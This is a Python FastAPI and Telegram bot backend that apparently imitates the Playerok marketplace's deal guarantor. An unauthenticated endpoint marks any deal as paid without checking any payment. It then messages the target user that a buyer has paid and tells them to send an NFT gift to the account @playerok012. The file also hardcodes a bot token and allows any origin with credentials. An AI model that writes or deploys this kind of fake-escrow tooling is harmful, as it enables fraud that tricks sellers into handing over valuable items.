import logging
import sqlite3
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from aiogram import Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

TOKEN = "9187770017:AAG3X7oTfwoyiMhWmZv_cuNHZY-zISmBzMA"
WEB_APP_URL = "https://your-domain.com"

bot = Bot(token=TOKEN)
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

def init_db():
    conn = sqlite3.connect("playerok.db")
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            rub REAL DEFAULT 0.0,
            usd REAL DEFAULT 0.0,
            uah REAL DEFAULT 0.0,
            byn REAL DEFAULT 0.0,
            stars INTEGER DEFAULT 0,
            ton REAL DEFAULT 0.0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            user_id INTEGER,
            item_name TEXT,
            amount REAL,
            status TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

class DealCreate(BaseModel):
    deal_id: str
    user_id: int
    item_name: str
    amount: float

@app.get("/api/get_user/{user_id}")
def get_user(user_id: int):
    conn = sqlite3.connect("playerok.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if not row:
        return {"user_id": user_id, "rub": 0.0, "usd": 0.0, "uah": 0.0, "byn": 0.0, "stars": 0, "ton": 0.0}
    return {
        "user_id": row[0], "username": row[1],
        "rub": row[2], "usd": row[3], "uah": row[4],
        "byn": row[5], "stars": row[6], "ton": row[7]
    }

@app.post("/api/pay_deal")
async def pay_deal(deal: DealCreate):
    conn = sqlite3.connect("playerok.db")
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO deals VALUES (?, ?, ?, ?, 'paid')", 
                   (deal.deal_id, deal.user_id, deal.item_name, deal.amount))
    conn.commit()
    conn.close()

    kb = InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(text="🔍 Зайти в сделку", web_app=WebAppInfo(url=f"{WEB_APP_URL}?deal={deal.deal_id}"))
        ]]
    )
    
    msg_text = (
        f"✅ **Покупатель оплатил сделку #{deal.deal_id}!**\n\n"
        f"📦 Товар: **{deal.item_name}**\n"
        f"💰 Сумма: **{deal.amount} ₽**\n\n"
        f"⚠️ **ВНИМАНИЕ:** Передайте NFT-подарок строго на аккаунт **@playerok012**, иначе гарант не подтвердит выдачу!"
    )

    await bot.send_message(chat_id=deal.user_id, text=msg_text, parse_mode="Markdown", reply_markup=kb)
    return {"status": "ok"}
